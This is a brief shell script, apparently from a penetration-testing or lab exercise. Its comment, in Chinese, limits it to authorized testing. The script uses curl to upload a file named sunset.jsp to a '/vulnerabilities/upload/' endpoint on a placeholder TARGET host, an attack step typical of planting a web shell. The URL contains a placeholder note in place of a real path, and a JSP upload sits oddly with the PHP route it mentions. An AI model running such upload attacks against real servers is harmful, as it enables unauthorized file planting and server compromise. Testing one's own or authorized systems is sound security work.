#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X POST 'http://TARGET:8080/vulnerabilities/upload/（043.php 所在路径，具体路由取决于部署）' \
  -F 'uploaded=@sunset.jsp;filename=sunset.jsp'
